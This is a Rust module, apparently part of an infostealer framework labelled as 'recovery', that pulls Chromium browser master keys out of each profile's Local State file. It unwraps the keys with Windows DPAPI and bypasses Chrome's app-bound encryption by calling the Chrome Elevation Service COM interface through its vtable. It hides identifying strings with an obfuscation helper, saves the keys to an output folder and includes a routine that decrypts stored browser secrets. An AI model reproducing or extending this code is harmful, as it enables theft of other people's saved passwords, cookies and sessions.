use crate::recovery::browser::browsers::{BrowserName, browser_data_roots};
use crate::recovery::context::RecoveryContext;
use crate::recovery::helpers::obfuscation::deobf;
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use aes_gcm::aead::Aead;
use aes_gcm::{Aes256Gcm, KeyInit, Nonce};
use async_trait::async_trait;
use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use std::ffi::c_void;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;
use windows_sys::Win32::Foundation::{HLOCAL, LocalFree};
use windows_sys::Win32::Security::Cryptography::{
    CRYPT_INTEGER_BLOB, CRYPTPROTECT_UI_FORBIDDEN, CryptUnprotectData,
};
use windows_sys::Win32::System::Com::{
    CLSCTX_LOCAL_SERVER, COINIT_MULTITHREADED, CoCreateInstance, CoInitializeEx,
};
use windows_sys::core::GUID;

const IID_IUNKNOWN: GUID = GUID {
    data1: 0x00000000,
    data2: 0x0000,
    data3: 0x0000,
    data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
};

const CLSID_ELEVATOR: GUID = GUID {
    data1: 0x7088E230,
    data2: 0x021D,
    data3: 0x4a25,
    data4: [0x82, 0x2E, 0x01, 0x30, 0x64, 0xE0, 0x7F, 0x16],
};

pub fn chromium_secrets_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    vec![Arc::new(ChromiumSecretsTask::new(ctx))]
}

pub struct ChromiumSecretsTask {
    specs: Vec<(BrowserName, PathBuf)>,
}

impl ChromiumSecretsTask {
    pub fn new(ctx: &RecoveryContext) -> Self {
        Self {
            specs: browser_data_roots(ctx),
        }
    }
}

#[async_trait]
impl RecoveryTask for ChromiumSecretsTask {
    fn label(&self) -> String {
        "Chromium Secrets".to_string()
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Browsers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();

        for (browser, root) in &self.specs {
            let local_state = root.join("Local State");
            if !local_state.exists() {
                continue;
            }

            if let Ok(Some(key)) = extract_master_key(&local_state) {
                let master_key_b64 = STANDARD.encode(&key);
                let browser_dir = ctx.output_dir.join("Browsers").join(browser.label());
                let _ = fs::create_dir_all(&browser_dir).await;
                
                let target = browser_dir.join("Master Key.txt");
                if let Ok(_) = tokio::fs::write(&target, &master_key_b64).await {
                    if let Ok(meta) = tokio::fs::metadata(&target).await {
                        artifacts.push(RecoveryArtifact {
                            label: format!("{} Master Key", browser.label()),
                            path: target,
                            size_bytes: meta.len(),
                            modified: meta.modified().ok(),
                        });
                    }
                }
            }
        }

        Ok(artifacts)
    }
}

pub fn extract_master_key(local_state_path: &Path) -> Result<Option<Vec<u8>>, RecoveryError> {
    let data = std::fs::read(local_state_path).map_err(|err| RecoveryError::Io(err))?;
    let json: serde_json::Value =
        serde_json::from_slice(&data).map_err(|err| RecoveryError::Custom(err.to_string()))?;

    if let Some(app_bound_key) = json
        .get("os_crypt")
        .and_then(|os| os.get("app_bound_encrypted_key"))
        .and_then(|value| value.as_str())
    {
        if let Ok(master_key) = decrypt_app_bound(app_bound_key) {
            return Ok(Some(master_key));
        }
    }

    if let Some(encrypted_key) = json
        .get("os_crypt")
        .and_then(|os| os.get("encrypted_key"))
        .and_then(|value| value.as_str())
    {
        let master_key = decode_chromium_key(encrypted_key)?;
        Ok(Some(master_key))
    } else {
        Ok(None)
    }
}

pub fn decrypt_chromium_value(
    encrypted: &[u8],
    master_key: &[u8],
) -> Result<String, RecoveryError> {
    if encrypted.len() >= 3 && encrypted[0] == b'v' && (encrypted[1] == b'1') {
        let nonce = Nonce::from_slice(&encrypted[3..15]);
        let payload = &encrypted[15..];
        let cipher = Aes256Gcm::new_from_slice(master_key)
            .map_err(|err| RecoveryError::Custom(format!("cipher init failed: {err}")))?;
        let decrypted = cipher
            .decrypt(nonce, payload)
            .map_err(|err| RecoveryError::Custom(format!("decryption failed: {err}")))?;
        String::from_utf8(decrypted)
            .map_err(|err| RecoveryError::Custom(format!("utf8 decode failed: {err}")))
    } else {
        let decrypted = dpapi_unprotect(encrypted)?;
        String::from_utf8(decrypted)
            .map_err(|err| RecoveryError::Custom(format!("utf8 decode failed: {err}")))
    }
}

fn decode_chromium_key(encoded: &str) -> Result<Vec<u8>, RecoveryError> {
    let mut decoded = STANDARD
        .decode(encoded)
        .map_err(|err| RecoveryError::Custom(format!("base64 decode failed: {err}")))?;

    let dpapi_header = deobf(&[0xFA, 0x9D, 0x8C, 0x9D, 0x84]);
    if decoded.starts_with(dpapi_header.as_bytes()) {
        decoded.drain(0..5);
        dpapi_unprotect(&decoded)
    } else {
        Ok(decoded)
    }
}

fn dpapi_unprotect(encrypted: &[u8]) -> Result<Vec<u8>, RecoveryError> {
    unsafe {
        let mut input = CRYPT_INTEGER_BLOB {
            cbData: encrypted.len() as u32,
            pbData: encrypted.as_ptr() as *mut u8,
        };
        let mut output = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: std::ptr::null_mut(),
        };

        let success = CryptUnprotectData(
            &mut input,
            std::ptr::null_mut(),
            std::ptr::null(),
            std::ptr::null(),
            std::ptr::null(),
            CRYPTPROTECT_UI_FORBIDDEN,
            &mut output,
        );

        if success == 0 {
            return Err(RecoveryError::Custom("CryptUnprotectData failed".into()));
        }

        let slice = std::slice::from_raw_parts(output.pbData, output.cbData as usize);
        let result = slice.to_vec();
        if !output.pbData.is_null() {
            let _ = LocalFree(output.pbData as HLOCAL);
        }
        Ok(result)
    }
}

fn decrypt_app_bound(encoded: &str) -> Result<Vec<u8>, RecoveryError> {
    let decoded = STANDARD
        .decode(encoded)
        .map_err(|err| RecoveryError::Custom(format!("base64 decode failed: {err}")))?;

    let appb_header = deobf(&[0xFC, 0x9D, 0x9D, 0x8F]);
    if !decoded.starts_with(appb_header.as_bytes()) {
        return Err(RecoveryError::Custom("invalid app-bound key header".into()));
    }

    unsafe {
        let _ = CoInitializeEx(std::ptr::null(), COINIT_MULTITHREADED as u32);

        let mut elevator: *mut c_void = std::ptr::null_mut();
        let hr = CoCreateInstance(
            &CLSID_ELEVATOR,
            std::ptr::null_mut(),
            CLSCTX_LOCAL_SERVER,
            &IID_IUNKNOWN,
            &mut elevator,
        );

        if hr < 0 {
            return Err(RecoveryError::Custom(format!(
                "failed to connect to Chrome Elevation Service: {hr}"
            )));
        }

        let input_wide: Vec<u16> = encoded.encode_utf16().chain(std::iter::once(0)).collect();
        let mut decrypted_ptr: *mut u16 = std::ptr::null_mut();
        let mut last_error: u32 = 0;

        let vtable = *(elevator as *const *const usize);
        let decrypt_data_ptr = *vtable.add(4);
        let decrypt_data_fn: unsafe extern "system" fn(
            this: *mut c_void,
            encrypted_data: *const u16,
            decrypted_data: *mut *mut u16,
            last_error: *mut u32,
        ) -> i32 = std::mem::transmute(decrypt_data_ptr);

        let hr = decrypt_data_fn(
            elevator,
            input_wide.as_ptr(),
            &mut decrypted_ptr,
            &mut last_error,
        );

        if hr < 0 {
            let release_ptr = *vtable.add(2);
            let release_fn: unsafe extern "system" fn(this: *mut c_void) -> u32 =
                std::mem::transmute(release_ptr);
            release_fn(elevator);
            return Err(RecoveryError::Custom(format!(
                "COM DecryptData failed: {hr} (last_error: {last_error})"
            )));
        }

        if decrypted_ptr.is_null() {
            let release_ptr = *vtable.add(2);
            let release_fn: unsafe extern "system" fn(this: *mut c_void) -> u32 =
                std::mem::transmute(release_ptr);
            release_fn(elevator);
            return Err(RecoveryError::Custom(
                "decryption returned null pointer".into(),
            ));
        }

        let mut len = 0;
        while *decrypted_ptr.add(len) != 0 {
            len += 1;
        }

        let decrypted_slice = std::slice::from_raw_parts(decrypted_ptr, len);
        let decrypted_string = String::from_utf16_lossy(decrypted_slice);
        let _ = LocalFree(decrypted_ptr as HLOCAL);

        let release_ptr = *vtable.add(2);
        let release_fn: unsafe extern "system" fn(this: *mut c_void) -> u32 =
            std::mem::transmute(release_ptr);
        release_fn(elevator);

        let master_key = STANDARD.decode(&decrypted_string).map_err(|err| {
            RecoveryError::Custom(format!("base64 decode of decrypted key failed: {err}"))
        })?;

        Ok(master_key)
    }
}
